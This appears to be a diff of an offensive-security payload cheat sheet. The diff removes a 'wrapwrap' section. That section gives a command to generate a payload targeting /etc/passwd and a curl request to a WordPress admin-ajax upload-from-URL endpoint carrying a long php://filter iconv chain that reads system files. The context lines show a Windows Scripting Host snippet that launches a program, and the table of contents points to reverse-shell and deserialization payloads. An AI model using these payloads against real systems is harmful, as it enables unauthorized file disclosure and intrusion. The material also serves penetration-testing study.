@@ -48,7 +48,6 @@
 - [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
 - [Visual Basic for Application (VBA)](#visual-basic-for-application-vba)
 - [Windows Scripting Host (WSH)](#windows-scripting-host-wsh)
-- [wrapwrap](#wrapwrap)
 - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
 - [xterm Reverse Shell](#xterm-reverse-shell)
 - [ysoserial](#ysoserial)
@@ -1095,20 +1094,6 @@ MsgBox message
 ```c
 Set shell = WScript.CreateObject(Wscript.Shell"")
 shell.Run("C:\Windows\System32\calc.exe" & WScript.ScriptFullName),0,True
-```
-
-## wrapwrap
-
-### Generating Payload
-
-```c
-$ python3 wrapwrap.py /etc/passwd "GIF89a" "" 1000
-```
-
-### Execution
-
-```c
-$ curl 'http://<RHOST>/wp-admin/admin-ajax.php' -H "Content-Type: application/x-www-form-urlencoded" -d 'action=upload_image_from_url&id=1&url=php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd&accepted_files=image/gif'
 ```
 
 ## Cross-Site Scripting (XSS)
